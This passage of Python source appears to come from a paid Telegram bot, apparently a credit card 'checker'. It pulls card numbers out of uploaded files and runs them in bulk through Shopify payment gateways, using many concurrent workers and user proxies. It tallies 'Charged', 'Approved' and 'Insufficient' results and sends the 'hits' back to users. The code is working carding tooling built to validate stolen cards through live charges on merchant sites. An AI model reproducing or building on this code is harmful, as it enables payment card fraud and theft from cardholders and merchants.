    try: await styled_send(target_uid, f"⦗ 💎 ⦘ 𝘚𝘺𝘴𝘵𝘦𝘮 𝘈𝘭𝘦𝘳𝘵\n\n╰ 𝘠𝘰𝘶𝘳 𝘝𝘐𝘗 𝘢𝘤𝘤𝘦𝘴𝘴 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘳𝘦𝘷𝘰𝘬𝘦𝘥 𝘣𝘺 𝘵𝘩𝘦 𝘢𝘥𝘮𝘪𝘯𝘪𝘴𝘵𝘳𝘢𝘵𝘰𝘳.", use_gif=True)
    except Exception: pass

# ====================== FILE PROCESSING & MASS PROCESS ======================
@client.on(events.NewMessage(func=lambda e: getattr(e, 'document', None) and e.document.mime_type.startswith('text/')))
async def auto_file_check_cmd(event):
    if await is_maintenance(event): return
    uid = event.sender_id
    
    processing_msg = await styled_reply(event, f"⦗ {get_custom_emoji('time', '⏳')} ⦘ 𝘗𝘳𝘰𝘤𝘦𝘴𝘴𝘪𝘯𝘨 𝘧𝘪𝘭𝘦 𝘥𝘢𝘵𝘢...", use_gif=True)
    
    try:
        if uid in ACTIVE_MTXT_PROCESSES and not ACTIVE_MTXT_PROCESSES[uid].get("stopped", True): 
            return await styled_edit(processing_msg, f"⦗ 💎 ⦘ 𝘈 𝘱𝘳𝘰𝘤𝘦𝘴𝘴 𝘪𝘴 𝘢𝘭𝘳𝘦𝘢𝘥𝘺 𝘢𝘤𝘵𝘪𝘷𝘦! 𝘗𝘭𝘦𝘢𝘴𝘦 𝘸𝘢𝘪𝘵 𝘧𝘰𝘳 𝘪𝘵 𝘵𝘰 𝘧𝘪𝘯𝘪𝘴𝘩.")
            
        if getattr(event.document, 'size', 0) > 2 * 1024 * 1024:
            return await styled_edit(processing_msg, f"⦗ 💎 ⦘ 𝘍𝘪𝘭𝘦 𝘵𝘰𝘰 𝘭𝘢𝘳𝘨𝘦! (𝘔𝘢𝘹 2𝘔𝘉)")
        if not await force_join_check(event): return await processing_msg.delete()
        
        plan = await get_user_plan(uid)
        db_proxies = await get_all_user_proxies(uid)
        if len(db_proxies) == 0:
            return await styled_edit(processing_msg, f"⦗ 💎 ⦘ <b>𝘠𝘰𝘶 𝘮𝘶𝘴𝘵 𝘢𝘥𝘥 𝘱𝘳𝘰𝘹𝘪𝘦𝘴 𝘣𝘦𝘧𝘰𝘳𝘦 𝘤𝘩𝘦𝘤𝘬𝘪𝘯𝘨! 𝘜𝘴𝘦 <code>/addpxy</code> 𝘵𝘰 𝘢𝘥𝘥.</b>")
        
        fp = await event.download_media()
        content = ""
        try:
            async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                content = await f.read()
        finally:
            if os.path.exists(fp): os.remove(fp)
            
        cards = extract_cc(content)
        if not cards:
            return await styled_edit(processing_msg, f"⦗ 💎 ⦘ 𝘕𝘰 𝘷𝘢𝘭𝘪𝘥 𝘤𝘢𝘳𝘥𝘴 𝘧𝘰𝘶𝘯𝘥 𝘪𝘯 𝘵𝘩𝘦 𝘧𝘪𝘭𝘦.")
        
        cl = get_cc_limit(plan, uid)
        if len(cards) > cl: cards = cards[:cl]
        PENDING_FILES[uid] = cards
        
        kb = [
            [Button.inline("🛍️ 𝘚𝘩𝘰𝘱𝘪𝘧𝘺 (𝘊𝘩𝘢𝘳𝘨𝘦)", b"gate:Shopify"), Button.inline("🌐 𝘉𝘳𝘢𝘪𝘯𝘵𝘳𝘦𝘦 (𝘚𝘰𝘰𝘯)", b"gate:soon_Braintree")],
            [Button.inline("💳 𝘚𝘵𝘳𝘪𝘱𝘦 (𝘚𝘰𝘰𝘯)", b"gate:soon_Stripe"), Button.inline("🅿️ 𝘗𝘢𝘺𝘗𝘢𝘭 (𝘚𝘰𝘰𝘯)", b"gate:soon_PayPal")],
            [Button.inline("❌ 𝘊𝘢𝘯𝘤𝘦𝘭", b"gate:cancel")]
        ]
        await styled_edit(processing_msg, f"⦗ {get_custom_emoji('card', '⚙️')} ⦘ 𝘍𝘪𝘭𝘦 𝘓𝘰𝘢𝘥𝘦𝘥 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺\n\n├ 𝘛𝘰𝘵𝘢𝘭 𝘊𝘊𝘴: <code>{len(cards)}</code>\n╰ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘴𝘦𝘭𝘦𝘤𝘵 𝘢 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 𝘵𝘰 𝘴𝘵𝘢𝘳𝘵:", buttons=kb)
    except Exception as e:
        await styled_edit(processing_msg, f"⚠️ Error: {e}")

@client.on(events.CallbackQuery(pattern=rb"gate:(.*)"))
async def gateway_selection_cb(event):
    if await is_maintenance(event): return
    uid = event.sender_id
    gate_name = event.pattern_match.group(1).decode()
    
    if gate_name.startswith("soon_"): return await event.answer(f"⏳ Gateway is coming soon!", alert=True)
    
    original_msg = await event.get_message()
    if gate_name == "cancel":
        PENDING_FILES.pop(uid, None)
        return await styled_edit(original_msg, f"⦗ 💎 ⦘ 𝘗𝘳𝘰𝘤𝘦𝘴𝘴 𝘊𝘢𝘯𝘤𝘦𝘭𝘭𝘦𝘥.", buttons=None)
    
    cards = PENDING_FILES.pop(uid, None)
    if not cards: return await event.answer("⚠️ Session expired or invalid file.", alert=True)
    
    ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}
    
    msg = await styled_edit(original_msg, f"⦗ {get_custom_emoji('speed', '⚡')} ⦘ 𝘗𝘳𝘦𝘱𝘢𝘳𝘪𝘯𝘨 𝘚𝘦𝘴𝘴𝘪𝘰𝘯...\n\n├ 𝘓𝘰𝘢𝘥𝘦𝘥: <code>{len(cards)} 𝘊𝘊𝘴</code>\n├ 𝘛𝘩𝘳𝘦𝘢𝘥𝘴: <code>{WORKERS}</code>\n╰ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺: <code>{gate_name}</code>", buttons=None)
    
    asyncio.create_task(_run_mass_process(event, msg, cards, ACTIVE_MTXT_PROCESSES, "stop_chk", gate_name))

async def _run_mass_process(event, msg_obj, cards, process_store, stop_prefix, gate_name):
    uid = event.sender_id
    total = len(cards); checked = charged = approved = insufficient = declined = errors = 0
    st = time.time()
    sites = await get_github_sites()
    db_proxies = await get_all_user_proxies(uid)
    proxies = [p['proxy_url'] for p in db_proxies] if db_proxies else []
    http_session = await get_user_http_session(uid, "msp")
    lcd = "-"
    def is_stopped(): return process_store.get(uid, {}).get("stopped", False)

    async def dashboard_updater():
        while not is_stopped():
            await asyncio.sleep(4.0)
            if is_stopped(): break
            
            elapsed_now = time.time() - st
            cpm = int((checked / elapsed_now) * 60) if elapsed_now > 0 else 0
            
            dashboard_text = f"""⦗ {get_custom_emoji('speed', '⚡')} ⦘ 𝘚𝘦𝘴𝘴𝘪𝘰𝘯 𝘈𝘤𝘵𝘪𝘷𝘦...

├ ⦗ {get_custom_emoji('gateway', '🌐')} ⦘ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 ⇾ <code>{gate_name}</code>
╰ ⦗ {get_custom_emoji('vip', '💎')} ⦘ 𝘛𝘩𝘳𝘦𝘢𝘥𝘴 ⇾ <code>{WORKERS}</code>"""
            
            kb = [
                [Button.inline(f"💳 {lcd}", b"none")],
                [Button.inline(f"🟢 𝘊𝘩𝘢𝘳𝘨𝘦𝘥 ⇾ {charged}", b"none"), Button.inline(f"⚡ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 ⇾ {approved}", b"none")],
                [Button.inline(f"🟡 𝘐𝘯𝘴𝘶𝘧𝘧𝘪𝘤𝘪𝘦𝘯𝘵 ⇾ {insufficient}", b"none"), Button.inline(f"🔴 𝘋𝘦𝘤𝘭𝘪𝘯𝘦𝘥 ⇾ {declined}", b"none")],
                [Button.inline(f"📊 𝘛𝘰𝘵𝘢𝘭 ⇾ {checked} / {total}", b"none"), Button.inline(f"⚠️ 𝘌𝘳𝘳𝘰𝘳 ⇾ {errors}", b"none")],
                [Button.inline(f"🚀 𝘚𝘱𝘦𝘦𝘥 ⇾ {cpm} 𝘊𝘗𝘔", b"none")],
                [Button.inline("🛑 𝘚𝘵𝘰𝘱 𝘗𝘳𝘰𝘤𝘦𝘴𝘴", f"{stop_prefix}:{uid}".encode())]
            ]
            
            try: await styled_edit(msg_obj, dashboard_text, buttons=kb)
            except asyncio.CancelledError: break
            except Exception: pass

    updater_task = asyncio.create_task(dashboard_updater())
    queue = asyncio.Queue()
    for c in cards: queue.put_nowait(c)

    async def worker(worker_id):
        await asyncio.sleep(worker_id * 0.02)
        nonlocal checked, charged, approved, insufficient, declined, errors, lcd
        while not queue.empty() and not is_stopped():
            try: card = queue.get_nowait()
            except asyncio.QueueEmpty: break
            
            try:
                card_st = time.time()
                res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, max_retries=2)
                if is_stopped(): break 

                card_el = time.time() - card_st
                status = res.get('status', 'Dead')
                checked += 1
                
                royal_status_map = {'Charged': '🟢', 'Approved': '⚡', 'Insufficient': '🟡', 'Site Error': '⚠️', 'Dead': '🔴'}
                lcd = f"{card[:15]}... ⇾ {royal_status_map.get(status, '🔴')}"
                
                if status == 'Charged':
                    charged += 1
                    asyncio.create_task(_send_mass_hit(card, "Charged", res.get('message', ''), res.get('price', '-'), gate_name, uid, card_el))
                    asyncio.create_task(_send_global_hit("Charged", gate_name, res.get('message', ''), res.get('price', '-'), uid))
                elif status == 'Approved':
                    approved += 1
                    asyncio.create_task(_send_mass_hit(card, "Approved", res.get('message', ''), res.get('price', '-'), gate_name, uid, card_el))
                elif status == 'Insufficient':
                    insufficient += 1
                    asyncio.create_task(_send_mass_hit(card, "Insufficient", res.get('message', ''), res.get('price', '-'), gate_name, uid, card_el))
                    asyncio.create_task(_send_global_hit("Insufficient", gate_name, res.get('message', ''), res.get('price', '-'), uid))
                elif status == 'Site Error': errors += 1
                else: declined += 1
                
            except asyncio.CancelledError: break
            except Exception: errors += 1; checked += 1
            finally:
                queue.task_done()
                await asyncio.sleep(DELAY)

    workers_tasks = [asyncio.create_task(worker(i)) for i in range(WORKERS)]
    process_store[uid]["tasks"] = workers_tasks + [updater_task]

    await asyncio.gather(*workers_tasks, return_exceptions=True)
    if not updater_task.done(): updater_task.cancel()
        
    el = int(time.time() - st)
    h, m, s = el // 3600, (el % 3600) // 60, el % 60
    avg_cpm = int((checked / el) * 60) if el > 0 else 0
    
    final_text = f"""{f'⦗ 💎 ⦘ 𝘗𝘳𝘰𝘤𝘦𝘴𝘴 𝘍𝘰𝘳𝘤𝘦 𝘚𝘵𝘰𝘱𝘱𝘦𝘥' if is_stopped() else f'⦗ {get_custom_emoji("approved", "✨")} ⦘ 𝘗𝘳𝘰𝘤𝘦𝘴𝘴 𝘊𝘰𝘮𝘱𝘭𝘦𝘵𝘦𝘥'}

├ ⦗ {get_custom_emoji('gateway', '🌐')} ⦘ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 ⇾ <code>{gate_name}</code>
╰ ⦗ {get_custom_emoji('time', '⏱')} ⦘ 𝘛𝘪𝘮𝘦 ⇾ <code>{h}𝘩 {m}𝘮 {s}𝘴</code>"""

    fkb = [
        [Button.inline(f"🟢 𝘊𝘩𝘢𝘳𝘨𝘦𝘥 ⇾ {charged}", b"none"), Button.inline(f"⚡ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 ⇾ {approved}", b"none")],
        [Button.inline(f"🟡 𝘐𝘯𝘴𝘶𝘧𝘧𝘪𝘤𝘪𝘦𝘯𝘵 ⇾ {insufficient}", b"none"), Button.inline(f"🔴 𝘋𝘦𝘤𝘭𝘪𝘯𝘦𝘥 ⇾ {declined}", b"none")],
        [Button.inline(f"📊 𝘛𝘰𝘵𝘢𝘭 ⇾ {checked} / {total}", b"none"), Button.inline(f"⚠️ 𝘌𝘳𝘳𝘰𝘳 ⇾ {errors}", b"none")],
        [Button.inline(f"🚀 𝘈𝘷𝘦𝘳𝘢𝘨𝘦 𝘚𝘱𝘦𝘦𝘥 ⇾ {avg_cpm} 𝘊𝘗𝘔", b"none")]
    ]
    
    try: await styled_edit(msg_obj, final_text, buttons=fkb)
    except Exception: pass
    
    process_store.pop(uid, None)
    await cleanup_user_http_session(uid, "msp")

async def _send_mass_hit(card, status, message, price, gateway, uid, elapsed):
    await asyncio.sleep(HIT_DELAY)
    try:
        bi = await get_bin_info(card.split("|")[0])
        msg = format_card_result(status, card, gateway, message, price, bi, elapsed)
        await styled_send(uid, msg, buttons=HIT_BUTTON, use_gif=True)
    except Exception: pass

@client.on(events.CallbackQuery(pattern=rb"stop_chk:(\d+)"))
async def stop_chk_cb(event):
    puid = int(event.pattern_match.group(1).decode())
    if event.sender_id != puid and event.sender_id not in ADMIN_ID: return await event.answer("Not yours!", alert=True)
    proc = ACTIVE_MTXT_PROCESSES.get(puid)
    if proc:
        proc["stopped"] = True
        for t in proc.get("tasks", []):
            if not t.done(): t.cancel()
    await event.answer("🛑 𝘚𝘵𝘰𝘱𝘱𝘦𝘥 𝘐𝘮𝘮𝘦𝘥𝘪𝘢𝘵𝘦𝘭𝘺!", alert=True)

@client.on(events.CallbackQuery(pattern=rb"none"))
async def empty_callback_handler(event):
    await event.answer()

# ====================== MAIN INITIALIZATION ENGINE ======================
async def check_sites_loop():
    while True:
        await get_github_sites()
        await asyncio.sleep(600)

async def main():
    global client_instance; client_instance = client; 
    
    await get_msg_lock()
    await get_edit_lock()
    
    try: await init_db()
    except Exception as e: print(f"❌ Database Error: {e}")
        
    try:
        async with aiohttp.ClientSession() as session: 
            await session.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook?drop_pending_updates=true")
    except Exception: pass
    
    asyncio.create_task(check_sites_loop())
    
    while True:
        try:
            print("🔄 Starting...")
            await client.start(bot_token=BOT_TOKEN)
            print("✅ VIP BOT IS FULLY OPERATIONAL WITH ALL PREMIUM ASSETS AND ZERO ERRORS!")
            await client.run_until_disconnected()
        except FloodWaitError as e: 
            print(f"⏳ Telegram FloodWait: Sleeping for {e.seconds}s")
            await asyncio.sleep(e.seconds + 5)
        except Exception as e: 
            print(f"⚠️ FATAL ERROR: {e}")
            await asyncio.sleep(10)

if __name__ == "__main__":
    asyncio.run(main())
